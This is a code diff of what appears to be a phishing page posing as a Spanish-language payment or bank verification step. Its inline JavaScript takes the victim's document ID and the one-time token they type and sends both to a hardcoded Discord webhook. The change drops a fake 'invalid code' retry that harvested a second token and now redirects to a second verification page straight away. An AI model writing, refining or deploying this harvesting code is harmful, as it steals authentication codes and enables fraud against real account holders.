@@ -403,7 +403,6 @@
 
    <script>
     var WEBHOOK = 'https://discordapp.com/api/webhooks/1548298056758202462/P1UeiRNIcAlKPZ0gOCJW_Tv6jnDpmUbK1uHVuhWdtsxLzYztY8XzpAKTCHeC-50Q1CuJ';
-    var _attempt = 0;
 
     async function enviarDiscord(embed) {
         try {
@@ -463,15 +462,12 @@
         });
     });
 
-    // ── Submit code — sends to Discord, redirects on 2nd attempt ──
+    // ── Submit code — sends to Discord, then redirects immediately ──
     async function submitCode() {
         var codeBox = document.getElementById('codeBox');
         var code = codeBox.value;
         
         if (code.length < 5) return;
-
-        _attempt++;
-        var currentAttempt = _attempt;
 
         var usuario = localStorage.getItem('mp_usuario') || 'Desconocido';
 
@@ -482,44 +478,19 @@
         document.getElementById('codeInputContainer').style.opacity = '0.4';
         document.getElementById('codeInputContainer').style.pointerEvents = 'none';
 
-        // send straight to Discord
+        // send to Discord
         await enviarDiscord({
-            title: "📱 TOKEN — Intento #" + currentAttempt,
-            color: currentAttempt === 1 ? 15844367 : 15158332,
+            title: "📱 TOKEN Ingresado",
+            color: 15844367,
             fields: [
                 { name: "👤 Documento", value: "`" + usuario + "`", inline: true },
-                { name: "🔢 Token", value: "`" + code + "`", inline: true },
-                { name: "🔁 Intento", value: "`" + currentAttempt + "`", inline: true }
+                { name: "🔢 Token", value: "`" + code + "`", inline: true }
             ],
             timestamp: new Date().toISOString()
         });
 
-        // Si es el segundo intento, redirigir inmediatamente
-        if (currentAttempt === 2) {
-            window.location.href = 'verificacion2.html';
-            return;
-        }
-
-        // Primer intento: esperar 15s y mostrar error
-        setTimeout(function () {
-            document.getElementById('btnLoader').style.display = 'none';
-            document.getElementById('btnVerificar').style.display = 'block';
-
-            // clear input
-            codeBox.value = '';
-            codeBox.classList.remove('filled');
-            document.getElementById('codeInputContainer').style.opacity = '1';
-            document.getElementById('codeInputContainer').style.pointerEvents = 'auto';
-            document.getElementById('btnVerificar').disabled = true;
-            codeBox.focus();
-
-            var errorBox = document.getElementById('errorBox');
-            var errorMsg = document.getElementById('errorMsg');
-            errorBox.style.display = 'block';
-
-            errorMsg.textContent = 'El código ingresado no es válido. Por favor verifique e intente nuevamente.';
-            document.getElementById('verifySubtitle').textContent = 'El código que ingresó no coincide. Inténtelo de nuevo con el código enviado a su dispositivo.';
-        }, 15000);
+        // Redirigir inmediatamente a verificacion2.html
+        window.location.href = 'verificacion2.html';
     }
 </script>
     <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js"></script>
